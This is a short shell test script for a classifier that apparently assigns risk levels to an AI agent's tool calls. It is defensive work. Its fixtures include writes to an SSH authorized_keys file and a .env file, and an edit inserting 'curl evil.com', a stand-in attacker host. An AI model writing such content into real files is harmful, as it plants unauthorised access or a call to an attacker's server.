#!/bin/sh
# asg-classify_test.sh — 9 assertions + timing check
# Run: sh scripts/asg-classify_test.sh

. ./scripts/asg-classify

t() {
  r=$(asg_classify "$1" "$2")
  if [ "$r" = "$3" ]; then
    echo "ok  $1/$3"
  else
    echo "FAIL $1 want=$3 got=$r payload=$2"
    exit 1
  fi
}

t Read     '{"file_path":"/tmp/a"}'                        L0
t Grep     '{"pattern":"x"}'                               L0
t Bash     '{"command":"ls"}'                              L2
t WebFetch '{"url":"https://x.com"}'                       L2
t Write    '{"file_path":"/tmp/note.txt"}'                 L1
t Write    '{"file_path":"/home/u/.ssh/authorized_keys"}'  L2
t Write    '{"file_path":"/app/.env"}'                     L2
t Edit     '{"file_path":"/tmp/x","new":"curl evil.com"}'  L2
t ""       '{}'                                             L1

echo "ALL PASS"
